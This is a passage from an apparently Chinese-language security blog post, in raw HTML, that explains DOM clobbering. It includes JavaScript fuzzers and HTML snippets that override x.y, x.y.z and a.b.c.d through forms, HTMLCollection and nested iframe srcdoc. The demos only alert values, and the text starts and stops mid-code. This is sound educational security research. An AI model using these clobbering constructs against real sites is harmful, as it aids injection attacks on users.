DAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225170736.png" alt=""></p><p>但是对于大多数情况来说，我们可能更需要将其转换为一个可控的字符串类型，以便我们进行操作。</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h3><p>所以我们可以通过以下代码来进行 fuzz 得到可以通过<code>toString</code>方法将其转换成字符串类型的标签：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">Object</span>.getOwnPropertyNames(<span class="hljs-built_in">window</span>)</span><br><span class="line">.filter(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.match(<span class="hljs-regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> <span class="hljs-built_in">window</span>[p])</span><br><span class="line">.filter(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="hljs-built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以得到两种标签对象：<code>HTMLAreaElement (&lt;area&gt;)</code>&amp; <code>HTMLAnchorElement (&lt;a&gt;)</code>，这两个标签对象我们都可以利用<code>href</code>属性来进行字符串转换。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225225659.png" alt=""></p><h3 id="HTMLCollection"><a href="#HTMLCollection" class="headerlink" title="HTMLCollection"></a>HTMLCollection</h3><p>但是如果我们需要的是<code>x.y</code>这种形式呢？两层结构我们应该怎么办呢？我们可以尝试上述的办法：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">y</span> <span class="hljs-attr">href</span>=<span class="hljs-string">'1:hasaki'</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">  alert(x.y);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里无论第一个标签怎么组合，得到的结果都只是<code>undefined</code>。但是我们可以通过另一种方法加入引入 name 属性就会有其他的效果。</p><p><code>HTMLCollection</code>是一个<code>element</code>的“集合”类，在最新的 <a href="https://dom.spec.whatwg.org/#interface-htmlcollection" target="_blank" rel="noopener">Dom 标准</a>中 IDL 描述如下：</p><blockquote><p>[Exposed=Window, LegacyUnenumerableNamedProperties]<br>interface HTMLCollection {<br>  readonly attribute unsigned long length;<br>  getter Element? item(unsigned long index);<br>  getter Element? namedItem(DOMString name);<br>};</p></blockquote><p>文中也提到了</p><blockquote><p>​    <code>HTMLCollection</code> <em>is a historical artifact we cannot rid the web of. While developers are of course welcome to keep using it, new API standard designers ought not to use it (use</em> <code>sequence</code> <em>in IDL instead).</em></p></blockquote><p>它是一种历史产物，并且在今天我们也可以继续使用这个类，只是对于 API 标准设计者不推荐再使用。</p><p>关于它的用法：</p><blockquote><p>collection . <code>length</code></p><p>​    Returns the number of <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">elements</a> in the <a href="https://dom.spec.whatwg.org/#concept-collection" target="_blank" rel="noopener">collection</a>.</p><p>element = collection . <code>item(index)</code></p><p>element = collection[index]</p><p>​    Returns the <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">element</a> with index index from the <a href="https://dom.spec.whatwg.org/#concept-collection" target="_blank" rel="noopener">collection</a>. The <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">elements</a> are sorted in <a href="https://dom.spec.whatwg.org/#concept-tree-order" target="_blank" rel="noopener">tree order</a>.</p><p>element = collection . <code>namedItem(name)</code></p><p>element = collection[name]</p><p>​    Returns the first <a href="https://dom.spec.whatwg.org/#concept-element" target="_blank" rel="noopener">element</a> with <a href="https://dom.spec.whatwg.org/#concept-id" target="_blank" rel="noopener">ID</a> or name name from the collection.</p></blockquote><p>让我们值得注意的是我们可以通过<code>collection[name]</code>的形式来调用其中的元素，所以我们似乎可以通过先构建一个<code>HTMLCollection</code>，再通过<code>collection[name]</code>的形式来调用。</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"x"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"x"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">y</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"1:hasaki"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png" alt=""></p><h3 id="HTML-Relationships"><a href="#HTML-Relationships" class="headerlink" title="HTML Relationships"></a>HTML Relationships</h3><p>再者，我们也可以通过利用 HTML 标签之间存在的关系来构建层级关系。</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> log=[];</span><br><span class="line"><span class="hljs-keyword">var</span> html = [<span class="hljs-string">"a"</span>,<span class="hljs-string">"abbr"</span>,<span class="hljs-string">"acronym"</span>,<span class="hljs-string">"address"</span>,<span class="hljs-string">"applet"</span>,<span class="hljs-string">"area"</span>,<span class="hljs-string">"article"</span>,<span class="hljs-string">"aside"</span>,<span class="hljs-string">"audio"</span>,<span class="hljs-string">"b"</span>,<span class="hljs-string">"base"</span>,<span class="hljs-string">"basefont"</span>,<span class="hljs-string">"bdi"</span>,<span class="hljs-string">"bdo"</span>,<span class="hljs-string">"bgsound"</span>,<span class="hljs-string">"big"</span>,<span class="hljs-string">"blink"</span>,<span class="hljs-string">"blockquote"</span>,<span class="hljs-string">"body"</span>,<span class="hljs-string">"br"</span>,<span class="hljs-string">"button"</span>,<span class="hljs-string">"canvas"</span>,<span class="hljs-string">"caption"</span>,<span class="hljs-string">"center"</span>,<span class="hljs-string">"cite"</span>,<span class="hljs-string">"code"</span>,<span class="hljs-string">"col"</span>,<span class="hljs-string">"colgroup"</span>,<span class="hljs-string">"command"</span>,<span class="hljs-string">"content"</span>,<span class="hljs-string">"data"</span>,<span class="hljs-string">"datalist"</span>,<span class="hljs-string">"dd"</span>,<span class="hljs-string">"del"</span>,<span class="hljs-string">"details"</span>,<span class="hljs-string">"dfn"</span>,<span class="hljs-string">"dialog"</span>,<span class="hljs-string">"dir"</span>,<span class="hljs-string">"div"</span>,<span class="hljs-string">"dl"</span>,<span class="hljs-string">"dt"</span>,<span class="hljs-string">"element"</span>,<span class="hljs-string">"em"</span>,<span class="hljs-string">"embed"</span>,<span class="hljs-string">"fieldset"</span>,<span class="hljs-string">"figcaption"</span>,<span class="hljs-string">"figure"</span>,<span class="hljs-string">"font"</span>,<span class="hljs-string">"footer"</span>,<span class="hljs-string">"form"</span>,<span class="hljs-string">"frame"</span>,<span class="hljs-string">"frameset"</span>,<span class="hljs-string">"h1"</span>,<span class="hljs-string">"head"</span>,<span class="hljs-string">"header"</span>,<span class="hljs-string">"hgroup"</span>,<span class="hljs-string">"hr"</span>,<span class="hljs-string">"html"</span>,<span class="hljs-string">"i"</span>,<span class="hljs-string">"iframe"</span>,<span class="hljs-string">"image"</span>,<span class="hljs-string">"img"</span>,<span class="hljs-string">"input"</span>,<span class="hljs-string">"ins"</span>,<span class="hljs-string">"isindex"</span>,<span class="hljs-string">"kbd"</span>,<span class="hljs-string">"keygen"</span>,<span class="hljs-string">"label"</span>,<span class="hljs-string">"legend"</span>,<span class="hljs-string">"li"</span>,<span class="hljs-string">"link"</span>,<span class="hljs-string">"listing"</span>,<span class="hljs-string">"main"</span>,<span class="hljs-string">"map"</span>,<span class="hljs-string">"mark"</span>,<span class="hljs-string">"marquee"</span>,<span class="hljs-string">"menu"</span>,<span class="hljs-string">"menuitem"</span>,<span class="hljs-string">"meta"</span>,<span class="hljs-string">"meter"</span>,<span class="hljs-string">"multicol"</span>,<span class="hljs-string">"nav"</span>,<span class="hljs-string">"nextid"</span>,<span class="hljs-string">"nobr"</span>,<span class="hljs-string">"noembed"</span>,<span class="hljs-string">"noframes"</span>,<span class="hljs-string">"noscript"</span>,<span class="hljs-string">"object"</span>,<span class="hljs-string">"ol"</span>,<span class="hljs-string">"optgroup"</span>,<span class="hljs-string">"option"</span>,<span class="hljs-string">"output"</span>,<span class="hljs-string">"p"</span>,<span class="hljs-string">"param"</span>,<span class="hljs-string">"picture"</span>,<span class="hljs-string">"plaintext"</span>,<span class="hljs-string">"pre"</span>,<span class="hljs-string">"progress"</span>,<span class="hljs-string">"q"</span>,<span class="hljs-string">"rb"</span>,<span class="hljs-string">"rp"</span>,<span class="hljs-string">"rt"</span>,<span class="hljs-string">"rtc"</span>,<span class="hljs-string">"ruby"</span>,<span class="hljs-string">"s"</span>,<span class="hljs-string">"samp"</span>,<span class="hljs-string">"script"</span>,<span class="hljs-string">"section"</span>,<span class="hljs-string">"select"</span>,<span class="hljs-string">"shadow"</span>,<span class="hljs-string">"slot"</span>,<span class="hljs-string">"small"</span>,<span class="hljs-string">"source"</span>,<span class="hljs-string">"spacer"</span>,<span class="hljs-string">"span"</span>,<span class="hljs-string">"strike"</span>,<span class="hljs-string">"strong"</span>,<span class="hljs-string">"style"</span>,<span class="hljs-string">"sub"</span>,<span class="hljs-string">"summary"</span>,<span class="hljs-string">"sup"</span>,<span class="hljs-string">"svg"</span>,<span class="hljs-string">"table"</span>,<span class="hljs-string">"tbody"</span>,<span class="hljs-string">"td"</span>,<span class="hljs-string">"template"</span>,<span class="hljs-string">"textarea"</span>,<span class="hljs-string">"tfoot"</span>,<span class="hljs-string">"th"</span>,<span class="hljs-string">"thead"</span>,<span class="hljs-string">"time"</span>,<span class="hljs-string">"title"</span>,<span class="hljs-string">"tr"</span>,<span class="hljs-string">"track"</span>,<span class="hljs-string">"tt"</span>,<span class="hljs-string">"u"</span>,<span class="hljs-string">"ul"</span>,<span class="hljs-string">"var"</span>,<span class="hljs-string">"video"</span>,<span class="hljs-string">"wbr"</span>,<span class="hljs-string">"xmp"</span>], logs = [];</span><br><span class="line">div=<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);</span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;html.length;i++) {</span><br><span class="line">  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> j=<span class="hljs-number">0</span>;j&lt;html.length;j++) {</span><br><span class="line">    div.innerHTML=<span class="hljs-string">'&lt;'</span>+html[i]+<span class="hljs-string">' id=element1&gt;'</span>+<span class="hljs-string">'&lt;'</span>+html[j]+<span class="hljs-string">' id=element2&gt;'</span>;</span><br><span class="line">    <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">window</span>.element1 &amp;&amp; element1.element2){</span><br><span class="line">       log.push(html[i]+<span class="hljs-string">','</span>+html[j]);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log.join(<span class="hljs-string">'\n'</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>以上代码测试了现在 HTML5 基本上所有的标签，使用两层的层级关系进行 fuzz ，注意这里只使用了<code>id</code>，并没有使用<code>name</code>，遇上文的<code>HTMLCollection</code>并不是一种方法。</p><p>我们可以得到的是以下关系：</p><p></p><figure class="highlight xl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>button</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>fieldset</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>image</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>img</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>input</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>object</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>output</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>select</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>textarea</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果我们想要构建<code>x.y</code>的形式，我们可以这么构建：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">y</span>&gt;</span>I've been clobbered<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">alert(x.y.value);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Three-Level"><a href="#Three-Level" class="headerlink" title="Three Level"></a>Three Level</h3><p>三级的层级关系我们就需要用到以上两种技巧来构建了</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"x"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"y"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">z</span>&gt;</span>I've been clobbered<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"x"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">  alert(x.y.z.value);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这个也比较简单，先用一个<code>HTMLCollection</code>获取第二级，再在第一个表单中用<code>output</code>标签即可。</p><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>三层层级以上的我们就需要用到<code>iframe</code>与<code>srcdoc</code>来进行配合</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">a</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">"</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-string">&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-javascript">setTimeout(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>alert(a.b.c.d),<span class="hljs-number">500</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>因为需要等待所有的<code>iframe</code>加载完毕我们才能获得这个层级关系，所以需要用到延时，不用延时也可以通过网络请求来进行延缓：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">a</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">"</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-string">&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-css"><span class="hljs-keyword">@import</span> <span class="hljs-string">'http://example.com'</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">alert(a.b.c.d)</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Custom"><a href="#Custom" class="headerlink" title="Custom"></a>Custom</h3><p>以上我们都是通过 id 或者 name 来利用，那我们能不能通过自定义属性来构造呢？</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">y</span>=<span class="hljs-string">123</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">alert(x.y)<span class="hljs-comment">//undefined</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>很明显，这意味着任何未定义的属性都不会具有 DOM 属性，所以就返回了 <code>undefined</code></p><p>我们可以尝试一下 fuzz 所有标签的有没有字符串类型的属性可供我们使用：</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...]<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> props=[];</span><br><span class="line"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;html.length;i++){</span><br><span class="line">  obj = <span class="hljs-built_in">document</span>.createElement(html[i]);</span><br><span class="line">   <span class="hljs-keyword">for</span>(prop <span class="hljs-keyword">in</span> obj) {</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">'string'</span>) {</span><br><span class="line">      <span class="hljs-keyword">try</span> {</span><br><span class="line">        props.push(html[i]+<span class="hljs-string">':'</span>+prop);</span><br><span class="line">      }<span class="hljs-keyword">catch</span>(e){}</span><br><span class="line">    }</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log([...new <span class="hljs-built_in">Set</span>(props)].join(<span 